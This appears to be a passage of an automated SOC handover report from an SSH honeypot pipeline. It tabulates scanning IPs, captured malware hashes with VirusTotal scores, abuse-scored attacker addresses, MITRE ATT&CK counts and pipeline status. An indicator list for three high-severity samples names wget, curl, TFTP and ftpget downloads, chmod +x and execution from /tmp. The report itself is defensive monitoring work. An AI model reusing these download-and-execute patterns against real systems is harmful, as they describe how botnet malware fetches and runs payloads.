- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **33** | 2026-07-28 04:55 | 2026-07-28 08:38 | 29m | 0 | `T1592` | 🟠 MEDIUM |
| `104.251.181[.]37` | **31** | 2026-07-28 08:38 | 2026-07-28 08:53 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `104.155.76[.]11` | **30** | 2026-07-28 06:52 | 2026-07-28 06:53 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.14.36[.]213` | **30** | 2026-07-28 05:56 | 2026-07-28 05:56 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.77[.]158` | **30** | 2026-07-28 05:12 | 2026-07-28 05:12 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-28 05:13 | 2026-07-28 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **6** | 2026-07-28 05:02 | 2026-07-28 07:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | **5** | 2026-07-28 05:46 | 2026-07-28 07:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]89` | **5** | 2026-07-28 06:54 | 2026-07-28 06:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | **3** | 2026-07-28 06:32 | 2026-07-28 07:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]34` | **3** | 2026-07-28 08:38 | 2026-07-28 08:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]197` | **3** | 2026-07-28 07:39 | 2026-07-28 07:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-07-28 05:35 | 2026-07-28 05:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-28 07:59 | 2026-07-28 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-28 08:24 | 2026-07-28 08:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-28 06:29 | 2026-07-28 06:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]132` | **3** | 2026-07-28 06:54 | 2026-07-28 06:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]190` | **3** | 2026-07-28 06:55 | 2026-07-28 06:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-07-28 08:37 | 2026-07-28 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.250.92[.]207` | **2** | 2026-07-28 08:34 | 2026-07-28 08:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | **2** | 2026-07-28 07:09 | 2026-07-28 07:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.71[.]100` | 1 | 2026-07-28 07:33 | 2026-07-28 07:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.248.206[.]108` | 1 | 2026-07-28 05:00 | 2026-07-28 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-07-28 05:44 | 2026-07-28 05:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.80.39[.]74` | 1 | 2026-07-28 07:34 | 2026-07-28 07:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.223.152[.]69` | 1 | 2026-07-28 07:00 | 2026-07-28 07:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-07-28 07:30 | 2026-07-28 07:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-07-28 08:38 | 2026-07-28 08:38 | 7s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-28 08:44 | 2026-07-28 08:45 | 43s | 0 | `T1592` | 🟢 LOW |
| `146.185.219[.]13` | 1 | 2026-07-28 07:43 | 2026-07-28 07:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.95.66[.]172` | 1 | 2026-07-28 06:21 | 2026-07-28 06:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `169.58.4[.]219` | 1 | 2026-07-28 05:47 | 2026-07-28 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]11` | 1 | 2026-07-28 06:49 | 2026-07-28 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.57[.]164` | 1 | 2026-07-28 05:42 | 2026-07-28 05:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]221` | 1 | 2026-07-28 05:09 | 2026-07-28 05:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.211.96[.]85` | 1 | 2026-07-28 07:00 | 2026-07-28 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.236.109[.]13` | 1 | 2026-07-28 06:07 | 2026-07-28 06:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-07-28 05:10 | 2026-07-28 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.97.69[.]110` | 1 | 2026-07-28 07:33 | 2026-07-28 07:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]20` | 1 | 2026-07-28 06:20 | 2026-07-28 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.70.97[.]74` | 1 | 2026-07-28 06:56 | 2026-07-28 06:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.202.112[.]63` | 1 | 2026-07-28 08:05 | 2026-07-28 08:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.83.130[.]199` | 1 | 2026-07-28 08:05 | 2026-07-28 08:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.131.206[.]255` | 1 | 2026-07-28 06:10 | 2026-07-28 06:10 | 20s | 0 | `T1592` | 🟢 LOW |
| `37.238.40[.]190` | 1 | 2026-07-28 05:59 | 2026-07-28 06:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-28 07:38 | 2026-07-28 07:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-07-28 05:38 | 2026-07-28 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-28 07:38 | 2026-07-28 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-07-28 06:12 | 2026-07-28 06:13 | 37s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-07-28 05:46 | 2026-07-28 05:48 | 114s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]104` | 1 | 2026-07-28 05:04 | 2026-07-28 05:04 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | 1 | 2026-07-28 07:48 | 2026-07-28 07:48 | 29s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-07-28 06:37 | 2026-07-28 06:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-28 08:37 | 2026-07-28 08:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-28 08:07 | 2026-07-28 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-07-28 04:55 | 2026-07-28 04:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]24` | 1 | 2026-07-28 07:13 | 2026-07-28 07:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | 1 | 2026-07-28 08:53 | 2026-07-28 08:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-07-28 08:14 | 2026-07-28 08:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-28 05:16 | 2026-07-28 05:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-28 08:52 | 2026-07-28 08:53 | 31s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-28 06:48 | 2026-07-28 06:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-28 06:33 | 2026-07-28 06:35 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `44fcd7a6a61dd418b64fd2fa3e0048d139740bf74a77d261a6900e24609e83f6` | ELF Binary (Linux executable) (x86 32-bit) | `44fcd7a6a61dd418...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 8 |
| `103.103.53[.]44` | IN | Catla IT and Engg.Co.Pvt.Ltd. | **100** ⚠️ | 50 |
| `104.155.76[.]11` | BE | Google LLC | **100** ⚠️ | 0 |
| `211.169.212[.]206` | KR | DACOM Corp. | **100** ⚠️ | 50 |
| `37.131.206[.]255` | RU | VPN (PPPoE) customers Sverdlovsk reg. Interra Ltd. | **100** ⚠️ | 2 |
| `106.89.60[.]3` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 1 |
| `213.230.64[.]246` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `66.132.172[.]196` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `208.109.38[.]143` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `66.132.172[.]132` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 422 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 399 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 677 cases |
| Tool 34  | Credential Extractor        | ✅ 439 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 11 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 162 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (3.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 99 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 399 priority case(s) shown individually · 63 recon entry/entries in table (21 group(s) consolidating 212 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-28T10:40:23Z_
